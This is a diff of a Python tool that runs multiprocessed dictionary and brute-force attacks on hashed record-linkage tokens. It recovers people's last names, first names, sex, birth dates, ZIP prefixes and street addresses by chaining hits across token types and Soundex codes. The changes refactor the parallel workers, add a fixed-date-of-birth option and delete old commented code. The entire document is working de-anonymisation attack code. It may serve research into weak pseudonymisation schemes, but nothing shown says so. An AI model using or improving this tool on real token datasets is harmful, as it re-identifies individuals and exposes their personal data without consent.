     t7_hits = attack_T7_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages)
     t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
@@ -781,12 +1038,318 @@ def attack_T7_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_FN_
         hits_with_context[mt] = (t7_preimage, t2_preimage)
     return hits_with_context
 
+# =============================
+# Multiprocessing Workers
+# =============================
+
+def chunk_list(data: list, num_chunks: int) -> list:
+    """Splits a list into num_chunks roughly equal chunks."""
+    if not data or num_chunks <= 0: return [data]
+    chunk_size = (len(data) + num_chunks - 1) // num_chunks  # Ceil division
+    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
+
+def attack_T1_fast_worker(
+    ln_chunk: list,
+    master_tokens: set,
+    initials_b: list,
+    dobs_b: list,
+    master_salt_bytes: bytes | None
+) -> Tuple[Dict[bytes, tuple], int]:
+    """
+    Worker for parallel T1 attack.
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    contains = master_tokens.__contains__
+    for ln in ln_chunk:
+        h_ln = init_hasher(ln + SEP)
+        for fi in initials_b:
+            h_fi = h_ln.copy(); h_fi.update(fi + SEP)
+            for g in SEX_B:
+                h_sig = h_fi.copy(); h_sig.update(g + SEP)
+                for dob in dobs_b:
+                    h = h_sig.copy(); h.update(dob)
+                    mt = digest_and_count(h)
+                    if contains(mt): hits[mt] = (ln, fi, g, dob)
+    return hits, HASHES
+
+def attack_T2_fast_worker(
+    sdx_ln_chunk: list,
+    master_tokens: set,
+    use_sdx_first_b: list,
+    dobs_b: list,
+    master_salt_bytes: bytes | None
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T2 attack.
+    
+    Returns:
+        Map { master_token: (sdx_ln, sdx_fn, sex, dob) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    contains = master_tokens.__contains__
+    for sdx_ln in sdx_ln_chunk:
+        h_ln = init_hasher(sdx_ln + SEP)
+        for sdx_fn in use_sdx_first_b:
+            h_fn = h_ln.copy(); h_fn.update(sdx_fn + SEP)
+            for g in SEX_B:
+                h_sig = h_fn.copy(); h_sig.update(g + SEP)
+                for dob in dobs_b:
+                    h = h_sig.copy(); h.update(dob)
+                    mt = digest_and_count(h)
+                    if contains(mt): hits[mt] = (sdx_ln, sdx_fn, g, dob)
+    return hits, HASHES
+    
+def attack_T2_via_T1_worker(
+    t1_hit_chunk: list, # A chunk of t1_hits.items()
+    master_tokens: set,
+    sdx_first: list,
+    last_to_sdx: dict,
+    master_salt_bytes: bytes | None
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T2-via-T1 (Dictionary) pivot.
+
+    Returns:
+        Map { master_token: (sdx_ln, sdx_fn, sex, dob) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    
+    # Each item in the chunk is (mt, (ln_b, fi_b, g_b, dob_b))
+    for mt, t1_preimage in t1_hit_chunk:
+        # Call the original serial function
+        out = attack_T2_via_T1(
+            master_tokens, sdx_first, *t1_preimage, last_to_sdx, init_hasher
+        )
+        hits.update(out)
+    return hits, HASHES
+
+def pivot_to_T3_fast_worker(
+    t4_hit_chunk: list, # A chunk of t4_pivot_hits.items()
+    master_tokens: set,
+    master_salt_bytes: bytes | None
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T3-via-T4 (Dictionary) pivot.
+
+    Returns:
+        Map { master_token: (ln, fn, dob, zip3) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    
+    # Each item is (mt, (ln_b, fn_b, g_b, dob_b))
+    for mt, t4_preimage in t4_hit_chunk:
+        # Call the original serial function
+        out = pivot_to_T3_fast(
+            master_tokens, t4_preimage[0], t4_preimage[1], t4_preimage[3], init_hasher # ln, fn, dob
+        )
+        hits.update(out)
+    return hits, HASHES
+
+def attack_T1_via_T2_pure_worker(
+    t2_hit_chunk: list,
+    master_tokens: set,
+    max_fn_len: int,
+    max_ln_len: int,
+    master_salt_bytes: bytes | None,
+    bf_max_preimages: int
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T1-via-T2 (Generator) attack with preimage cap.
+
+    Returns:
+        Map { master_token: ((ln, fi3, sex, dob), (sdx_ln, sdx_fn, sex, dob)) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    all_hits_pure = {}
+    for t2_hit in t2_hit_chunk:
+        sdx_ln_b, sdx_fn_b, g_b, dob_b = t2_hit
+        t1_hits = attack_T1_via_T2_generator(
+            master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b,
+            max_ln_len, init_hasher, bf_max_preimages
+        )
+        t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
+        for mt, t1_preimage in t1_hits.items():
+            all_hits_pure[mt] = (t1_preimage, t2_preimage)
+            
+    return all_hits_pure, HASHES
+
+def attack_T7_via_T2_pure_worker(
+    t2_hit_chunk: list,
+    master_tokens: set,
+    max_fn_len: int,
+    max_ln_len: int,
+    master_salt_bytes: bytes | None,
+    bf_max_preimages: int
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T7-via-T2 (Generator) attack.
+
+    Returns:
+        Map { master_token: ((ln, fi3, sex, dob), (sdx_ln, sdx_fn, sex, dob)) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    all_hits_pure = {}
+    for t2_hit in t2_hit_chunk:
+        sdx_ln_b, sdx_fn_b, g_b, dob_b = t2_hit
+        t7_hits = attack_T7_via_T2_generator(
+            master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b,
+            max_ln_len, init_hasher, bf_max_preimages
+        )
+        t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
+        for mt, t7_preimage in t7_hits.items():
+            all_hits_pure[mt] = (t7_preimage, t2_preimage)
+
+    return all_hits_pure, HASHES
+
+def attack_T7_via_T1_worker(
+    t1_hit_chunk: list, # A chunk of t1_hits.items()
+    master_tokens: set,
+    master_salt_bytes: bytes | None
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T7-via-T1 (Dictionary) pivot.
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    
+    # Each item in the chunk is (mt, (ln_b, fi_b, g_b, dob_b))
+    for mt, t1_preimage in t1_hit_chunk:
+        # Call the original serial function
+        out = attack_T7_via_T1(
+            master_tokens, *t1_preimage, init_hasher
+        )
+        hits.update(out)
+    return hits, HASHES
+
+def attack_T7_via_T2_worker(
+    t2_hit_chunk: list, # A chunk of t2_hits.items()
+    master_tokens: set,
+    ln_by_sdx: dict,
+    fn_by_sdx: dict,
+    master_salt_bytes: bytes | None
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T7-via-T2 (Dictionary) pivot.
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    
+    # Each item in the chunk is (mt, (sdx_ln_b, sdx_fn_b, g_b, dob_b))
+    for mt, t2_preimage in t2_hit_chunk:
+        # Call the original serial function
+        out = attack_T7_via_T2(
+            master_tokens, *t2_preimage, ln_by_sdx, fn_by_sdx, init_hasher
+        )
+        hits.update(out)
+    return hits, HASHES
+
+def pivot_to_T4_via_T1_T2_worker(
+    t1_hit_chunk: list, 
+    master_tokens: set,
+    max_fn_len: int,
+    master_salt_bytes: bytes | None,
+    bf_max_preimages: int
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T4-via-T1/T2 (Generator) attack.
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    for mt, (t1_preimage, t2_preimage) in t1_hit_chunk:
+        out = pivot_to_T4_via_T1_T2_generator(
+            master_tokens, t1_preimage, t2_preimage,
+            max_fn_len, init_hasher, bf_max_preimages
+        )
+        hits.update(out)
+    return hits, HASHES
+
+def pivot_to_T4_via_T7_T2_worker(
+    t7_hit_chunk: list, 
+    master_tokens: set,
+    max_fn_len: int,
+    max_ln_len: int,
+    master_salt_bytes: bytes | None,
+    bf_max_preimages: int
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T4-via-T7/T2 (Generator) attack.
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    for mt, (t7_preimage, t2_preimage) in t7_hit_chunk:
+        (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
+        (ln_b, fi3_b, g_b, dob_b) = t7_preimage 
+        out = pivot_to_T4_via_T7_T2_generator(
+            master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b,
+            max_fn_len, max_ln_len, init_hasher, bf_max_preimages
+        )
+        hits.update(out)
+    return hits, HASHES
+
+def pivot_to_T9_fast_worker(
+    t4_hit_chunk: list, # A chunk of t4_pivot_hits.items()
+    master_tokens: set,
+    address_list_raw: list,
+    lang: str,
+    exclude_house_numbers: bool,
+    house_numbers: list,
+    master_salt_bytes: bytes | None
+) -> Tuple[Dict[bytes, tuple], int]:
+    """Worker for parallel T9-via-T4 (Dictionary) pivot.
+
+    Returns:
+        Map { master_token: (fn, address) }
+    """
+    global HASHES
+    HASHES = 0
+    init_hasher = make_init_hasher(master_salt_bytes)
+    hits = {}
+    
+    # Each item is (mt, (ln_b, fn_b, g_b, dob_b))
+    for mt, t4_preimage in t4_hit_chunk:
+        # Call the original serial function with the first name
+        out = pivot_to_T9_fast(
+            master_tokens, t4_preimage[1], address_list_raw, lang, exclude_house_numbers, house_numbers, init_hasher
+        )
+        hits.update(out)
+    return hits, HASHES
 
 # =============================
 # Dictionaries / Distribution Loading
 # =============================
 
 def use_dictionaries(lang: str, bruteforce: bool):
+    """Load hardcoded dictionaries from text files."""
     global TOP_FIRST, TOP_LAST, TOP_ADDRESS
     TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], [] 
     street_file = "strassennamen.txt" if lang == "de" else "streetnames.txt"
@@ -813,6 +1376,7 @@ def use_dictionaries(lang: str, bruteforce: bool):
 
 
 def load_distribution(dist_file: str, top_n: int, bruteforce: bool):
+    """Load top N entries from a CSV distribution file."""
     global TOP_FIRST, TOP_LAST, TOP_ADDRESS
     TOP_FIRST, TOP_LAST, TOP_ADDRESS = [], [], []
     try:
@@ -835,268 +1399,24 @@ def load_distribution(dist_file: str, top_n: int, bruteforce: bool):
 
     print(f"[*] Loaded distribution file '{dist_file}': top_n={top_n} (firsts={len(TOP_FIRST)}, lasts={len(TOP_LAST)}, addresses={len(TOP_ADDRESS)})")
 
-# =============================
-# Multiprocessing Workers
-# =============================
+# ==============================================================================
+# GLOBAL CONSTANTS AND PRECOMPUTATIONS
+# ==============================================================================
 
-def chunk_list(data: list, num_chunks: int) -> list:
-    """Splits a list into num_chunks roughly equal chunks."""
-    if not data or num_chunks <= 0: return [data]
-    chunk_size = (len(data) + num_chunks - 1) // num_chunks  # Ceil division
-    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
+TOP_FIRST: list = []
+TOP_LAST: list = []
+TOP_ADDRESS: list = []
+SEX_B = [b"m", b"f", b"u"]
+INITIALS_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]
+ZIP3_PARTS = [f"{z:03d}".encode("utf-8") for z in range(1000)]
 
-def attack_T1_fast_worker(
-    ln_chunk: list,
-    master_tokens: set,
-    initials_b: list,
-    dobs_b: list,
-    master_salt_bytes: bytes | None
-) -> Tuple[Dict[bytes, tuple], int]:
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    contains = master_tokens.__contains__
-    for ln in ln_chunk:
-        h_ln = init_hasher(ln + SEP)
-        for fi in initials_b:
-            h_fi = h_ln.copy(); h_fi.update(fi + SEP)
-            for g in SEX_B:
-                h_sig = h_fi.copy(); h_sig.update(g + SEP)
-                for dob in dobs_b:
-                    h = h_sig.copy(); h.update(dob)
-                    mt = digest_and_count(h)
-                    if contains(mt): hits[mt] = (ln, fi, g, dob)
-    return hits, HASHES
+today = date.today()
+min_age, max_age = 18, 80
+min_year, max_year = today.year - max_age, today.year - min_age
 
-def attack_T2_fast_worker(
-    sdx_ln_chunk: list,
-    master_tokens: set,
-    use_sdx_first_b: list,
-    dobs_b: list,
-    master_salt_bytes: bytes | None
-) -> Tuple[Dict[bytes, tuple], int]:
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    contains = master_tokens.__contains__
-    for sdx_ln in sdx_ln_chunk:
-        h_ln = init_hasher(sdx_ln + SEP)
-        for sdx_fn in use_sdx_first_b:
-            h_fn = h_ln.copy(); h_fn.update(sdx_fn + SEP)
-            for g in SEX_B:
-                h_sig = h_fn.copy(); h_sig.update(g + SEP)
-                for dob in dobs_b:
-                    h = h_sig.copy(); h.update(dob)
-                    mt = digest_and_count(h)
-                    if contains(mt): hits[mt] = (sdx_ln, sdx_fn, g, dob)
-    return hits, HASHES
-    
-def attack_T2_via_T1_worker(
-    t1_hit_chunk: list, # A chunk of t1_hits.items()
-    master_tokens: set,
-    sdx_first: list,
-    last_to_sdx: dict,
-    master_salt_bytes: bytes | None
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T2-via-T1 (Dictionary) pivot."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    
-    # Each item in the chunk is (mt, (ln_b, fi_b, g_b, dob_b))
-    for mt, t1_preimage in t1_hit_chunk:
-        # Call the original serial function
-        out = attack_T2_via_T1(
-            master_tokens, sdx_first, *t1_preimage, last_to_sdx, init_hasher
-        )
-        hits.update(out)
-    return hits, HASHES
-
-def pivot_to_T3_fast_worker(
-    t4_hit_chunk: list, # A chunk of t4_pivot_hits.items()
-    master_tokens: set,
-    master_salt_bytes: bytes | None
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T3-via-T4 (Dictionary) pivot."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    
-    # Each item is (mt, (ln_b, fn_b, g_b, dob_b))
-    for mt, t4_preimage in t4_hit_chunk:
-        # Call the original serial function
-        out = pivot_to_T3_fast(
-            master_tokens, t4_preimage[0], t4_preimage[1], t4_preimage[3], init_hasher # ln, fn, dob
-        )
-        hits.update(out)
-    return hits, HASHES
-
-def attack_T1_via_T2_pure_worker(
-    t2_hit_chunk: list,
-    master_tokens: set,
-    max_fn_len: int,
-    max_ln_len: int,
-    master_salt_bytes: bytes | None,
-    bf_max_preimages: int
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T1-via-T2 (Generator) attack with preimage cap."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    all_hits_pure = {}
-    for t2_hit in t2_hit_chunk:
-        sdx_ln_b, sdx_fn_b, g_b, dob_b = t2_hit
-        t1_hits = attack_T1_via_T2_generator(
-            master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b,
-            max_ln_len, init_hasher, bf_max_preimages
-        )
-        t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
-        for mt, t1_preimage in t1_hits.items():
-            all_hits_pure[mt] = (t1_preimage, t2_preimage)
-            
-    return all_hits_pure, HASHES
-
-def attack_T7_via_T2_pure_worker(
-    t2_hit_chunk: list,
-    master_tokens: set,
-    max_fn_len: int,
-    max_ln_len: int,
-    master_salt_bytes: bytes | None,
-    bf_max_preimages: int
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T7-via-T2 (Generator) attack."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    all_hits_pure = {}
-    for t2_hit in t2_hit_chunk:
-        sdx_ln_b, sdx_fn_b, g_b, dob_b = t2_hit
-        t7_hits = attack_T7_via_T2_generator(
-            master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b,
-            max_ln_len, init_hasher, bf_max_preimages
-        )
-        t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
-        for mt, t7_preimage in t7_hits.items():
-            all_hits_pure[mt] = (t7_preimage, t2_preimage)
-
-    return all_hits_pure, HASHES
-
-def attack_T7_via_T1_worker(
-    t1_hit_chunk: list, # A chunk of t1_hits.items()
-    master_tokens: set,
-    master_salt_bytes: bytes | None
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T7-via-T1 (Dictionary) pivot."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    
-    # Each item in the chunk is (mt, (ln_b, fi_b, g_b, dob_b))
-    for mt, t1_preimage in t1_hit_chunk:
-        # Call the original serial function
-        out = attack_T7_via_T1(
-            master_tokens, *t1_preimage, init_hasher
-        )
-        hits.update(out)
-    return hits, HASHES
-
-def attack_T7_via_T2_worker(
-    t2_hit_chunk: list, # A chunk of t2_hits.items()
-    master_tokens: set,
-    ln_by_sdx: dict,
-    fn_by_sdx: dict,
-    master_salt_bytes: bytes | None
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T7-via-T2 (Dictionary) pivot."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    
-    # Each item in the chunk is (mt, (sdx_ln_b, sdx_fn_b, g_b, dob_b))
-    for mt, t2_preimage in t2_hit_chunk:
-        # Call the original serial function
-        out = attack_T7_via_T2(
-            master_tokens, *t2_preimage, ln_by_sdx, fn_by_sdx, init_hasher
-        )
-        hits.update(out)
-    return hits, HASHES
-
-def pivot_to_T4_via_T1_T2_worker(
-    t1_hit_chunk: list, 
-    master_tokens: set,
-    max_fn_len: int,
-    master_salt_bytes: bytes | None,
-    bf_max_preimages: int
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T4-via-T1/T2 (Generator) attack."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    for mt, (t1_preimage, t2_preimage) in t1_hit_chunk:
-        out = pivot_to_T4_via_T1_T2_generator(
-            master_tokens, t1_preimage, t2_preimage,
-            max_fn_len, init_hasher, bf_max_preimages
-        )
-        hits.update(out)
-    return hits, HASHES
-
-def pivot_to_T4_via_T7_T2_worker(
-    t7_hit_chunk: list, 
-    master_tokens: set,
-    max_fn_len: int,
-    max_ln_len: int,
-    master_salt_bytes: bytes | None,
-    bf_max_preimages: int
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T4-via-T7/T2 (Generator) attack."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    for mt, (t7_preimage, t2_preimage) in t7_hit_chunk:
-        (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
-        (ln_b, fi3_b, g_b, dob_b) = t7_preimage 
-        out = pivot_to_T4_via_T7_T2_generator(
-            master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b,
-            max_fn_len, max_ln_len, init_hasher, bf_max_preimages
-        )
-        hits.update(out)
-    return hits, HASHES
-
-def pivot_to_T9_fast_worker(
-    t4_hit_chunk: list, # A chunk of t4_pivot_hits.items()
-    master_tokens: set,
-    address_list_raw: list,
-    lang: str,
-    exclude_house_numbers: bool,
-    house_numbers: list,
-    master_salt_bytes: bytes | None
-) -> Tuple[Dict[bytes, tuple], int]:
-    """Worker for parallel T9-via-T4 (Dictionary) pivot."""
-    global HASHES
-    HASHES = 0
-    init_hasher = make_init_hasher(master_salt_bytes)
-    hits = {}
-    
-    # Each item is (mt, (ln_b, fn_b, g_b, dob_b))
-    for mt, t4_preimage in t4_hit_chunk:
-        # Call the original serial function with the first name
-        out = pivot_to_T9_fast(
-            master_tokens, t4_preimage[1], address_list_raw, lang, exclude_house_numbers, house_numbers, init_hasher
-        )
-        hits.update(out)
-    return hits, HASHES
-
-# =============================
-# Orchestrator
-# =============================
+# ==============================================================================
+# MAIN ORCHESTRATOR
+# ==============================================================================
 
 def run_attack(args):
     global HASHES
@@ -1115,20 +1435,26 @@ def run_attack(args):
     TOP_LAST_B    = to_bytes_list(TOP_LAST)
     TOP_ADDRESS_  = TOP_ADDRESS[:]
     
-    # DOBS_B        = [b"20000101"] 
-    DOBS_B        = precompute_dobs(min_year, max_year) # <-- Use this for the real attack
+    # Precompute DOBs
+    if args.fix_dob:
+        DOBS_B        = [b"20000101"] 
+    else:
+        DOBS_B        = precompute_dobs(min_year, max_year)
     
+    # Build Soundex maps
     FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B = build_soundex_maps(TOP_FIRST_B, TOP_LAST_B)
     HOUSE_NUMBERS = precompute_house_numbers(args.lang)
     FIRST3_MAP    = build_first3_map(TOP_FIRST_B)
     last_to_sdx   = {ln_b: sdx for sdx, names in LN_BY_SDX.items() for ln_b in names}
     
+    # Precompute all Soundex codes for brute-force mode
     ALL_SDX_LN, ALL_SDX_FN = set(), set()
     if args.bruteforce:
         print("[*] Precomputing all possible Soundex codes...")
         ALL_SDX_LN, ALL_SDX_FN = precompute_all_soundex_codes()
         print(f"    -> Generated {len(ALL_SDX_LN)} LN codes and {len(ALL_SDX_FN)} FN codes.")
     
+    # Brute-force parameters
     MAX_FN_LEN = args.max_fn_len
     MAX_LN_LEN = args.max_ln_len
     if args.bruteforce:
@@ -1259,12 +1585,7 @@ def run_attack(args):
                 t2_time = time.time() - start
                 print(f"    -> Found {len(t2_hits)} T2 preimages ({t2_time:.2f}s). Hashes: {HASHES}")
             if "T7" in dec and t1_hits and t2_hits: 
-                """print("[*] Attacking T7 via T1 dictionary hits..."); start = time.time()
-                for _, t1_preimage in t1_hits.items():
-                    out = attack_T7_via_T2_T1(dec["T7"], *t1_preimage, init_hasher)
-                    t7_hits.update(out)"""
                 print("[*] Attacking T7 via T1 and T2 intersection..."); start = time.time()
-                #t2_lookup = { (p[0], p[2], p[3]): p[1] for p in t2_hits.values() }
                 t2_lookup = defaultdict(list)
                 for (sdx_ln, sdx_fn, g, dob) in t2_hits.values():
                     t2_lookup[(sdx_ln, g, dob)].append(sdx_fn)
@@ -1280,13 +1601,6 @@ def run_attack(args):
                         for sdx_fn_b in sdx_fn_list:
                             out = attack_T7_via_T2_T1(dec["T7"], ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher)
                             t7_hits.update(out)
-                    """if sdx_fn_list:
-                        for sdx_fn_b in sdx_fn_list:
-                            out = attack_T7_via_T2_T1(dec["T7"], ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher)
-                            t7_hits.update(out)
-                    else:
-                        out = attack_T7_via_T1(dec["T7"], *t1_preimage, init_hasher)
-                        t7_hits.update(out)"""
                 t7_time = time.time() - start
                 print(f"     -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")
             if "T4" in dec and t7_hits:
@@ -1310,14 +1624,6 @@ def run_attack(args):
                                                      sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, 
                                                      LN_BY_SDX, FN_BY_SDX, init_hasher)
                             t4_pivot_hits.update(out)
-                    """if sdx_fn_list:
-                        for sdx_fn_b in sdx_fn_list:
-                            out = pivot_to_T4_via_T7_T2(dec["T4"], 
-                                                     sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, 
-                                                     LN_BY_SDX, FN_BY_SDX, init_hasher)
-                    else:
-                        out = pivot_to_T4_via_T7(dec["T4"], *t7_preimage, FIRST3_MAP, init_hasher)
-                    t4_pivot_hits.update(out)"""
                 t4_time = time.time() - start
                 print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")
 
@@ -1367,13 +1673,6 @@ def run_attack(args):
                                     for sdx_fn_b in sdx_fn_list:
                                         out = attack_T7_via_T2_T1(dec["T7"], ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher)
                                         t7_hits.update(out)
-                               """if sdx_fn_list:
-                                for sdx_fn_b in sdx_fn_list:
-                                    out = attack_T7_via_T2_T1(dec["T7"], ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher)
-                                    t7_hits.update(out)
-                               else: 
-                                   out = attack_T7_via_T1(dec["T7"], *t1_preimage, init_hasher)
-                                   t7_hits.update(out)"""
                            t7_time = time.time() - start
                            print(f"     -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")
                       elif args.columns == "T2,T7,T4,T3,T9" and t2_hits and not t1_hits:
@@ -1387,11 +1686,6 @@ def run_attack(args):
                            t7_hits = {mt: pre[0] for mt, pre in t7_hits_pure.items()} # Simple map for output
                            t7_time = time.time() - start
                            print(f"     -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")
-                           """for _, t2_preimage in t2_hits.items():
-                                out = attack_T7_via_T2(dec["T7"], *t2_preimage, LN_BY_SDX, FN_BY_SDX, init_hasher)
-                                t7_hits.update(out)
-                           t7_time = time.time() - start
-                           print(f"     -> Found {len(t7_hits)} T7 preimages ({t7_time:.2f}s). Hashes: {HASHES}")"""
 
              if "T4" in dec:
                 if t7_hits_pure: 
@@ -1417,19 +1711,6 @@ def run_attack(args):
                          
                      t4_time = time.time() - start
                      print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")
-                """if t7_hits and t2_hits: 
-                     print("[*] Pivoting to T4 via T7 and T2 dictionary hits..."); start = time.time()
-                        for _, t2_preimage in t2_hits.items():
-                         (sdx_ln_b, sdx_fn_b, g_b, dob_b) = t2_preimage
-                         matching_t7_hits = []
-                         for mt, t7_preimage in t7_hits.items():
-                             if (t7_preimage[2] == g_b) and (t7_preimage[3] == dob_b):
-                                 matching_t7_hits.append(t7_preimage)
-                         for t7_preimage in matching_t7_hits:
-                             out = pivot_to_T4_via_T7_T2(dec["T4"], sdx_ln_b, sdx_fn_b, t7_preimage[1], g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher)
-                             t4_pivot_hits.update(out)
-                     t4_time = time.time() - start
-                     print(f"    -> Found {len(t4_pivot_hits)} T4 preimages ({t4_time:.2f}s). Hashes: {HASHES}")"""
                 if t7_hits and not t2_hits:
                      print("[*] Pivoting to T4 via T7 dictionary hits only..."); start = time.time()
                      for _, t7_preimage in t7_hits.items():
@@ -1523,10 +1804,6 @@ def run_attack(args):
             if "T4" in dec and t7_hits_pure:
                 print("[*] Pivoting to T4 via T7/T2 (Pure BF, Parallel)..."); start = time.time()
                 t7_hits_list = list(t7_hits_pure.items())
-                #for _, (t7_preimage, t2_preimage) in t7_hits_pure.items():
-                #    out = pivot_to_T4_via_T7_T2_generator(dec["T4"], *t2_preimage[:2], *t7_preimage[1:], MAX_FN_LEN, MAX_LN_LEN, init_hasher, args.bf_max_preimages)
-                #    t4_pivot_hits.update(out)
-                #t4_time = time.time() - start
                 t7_chunks = chunk_list(t7_hits_list, num_processes)
                 pool_args = partial(pivot_to_T4_via_T7_T2_worker,
                                     master_tokens=dec["T4"],
@@ -1638,14 +1915,6 @@ def run_attack(args):
         t3_time = time.time() - start
         print(f"    -> Found {len(t3_pivot_hits)} T3 ({t3_time:.2f}s). Hashes: {HASHES}")
 
-    """if "T9" in dec and t4_pivot_hits and TOP_ADDRESS_:
-        print("[*] Pivoting to T9 via T4..."); start = time.time()
-        for _, t4_preimage in t4_pivot_hits.items():
-             out = pivot_to_T9_fast(dec["T9"], t4_preimage[1], TOP_ADDRESS_, args.lang, HOUSE_NUMBERS, init_hasher) 
-             t9_pivot_hits.update(out)
-        t9_time = time.time() - start
-        print(f"    -> Found {len(t9_pivot_hits)} T9 ({t9_time:.2f}s). Hashes: {HASHES}")"""
-
     if "T9" in dec and t4_pivot_hits and TOP_ADDRESS_:
         print("[*] Pivoting to T9 via T4 (Parallel)..."); start = time.time()
         t4_hits_list = list(t4_pivot_hits.items())
@@ -1723,6 +1992,7 @@ def main():
     ap.add_argument("--bf-max-preimages", type=int, default=100000,
                      help="Max Soundex preimages per hit in pure BF stage (limits memory/time) (default: 100000).")
     ap.add_argument("--excl-nr", action="store_true", help="Exclude use house numbers for T9 pivoting.")
+    ap.add_argument("--fix-dob", action="store_true", help="Only try fix DOB value (20000101) for all tokens.")
     args = ap.parse_args()
     run_attack(args)
 
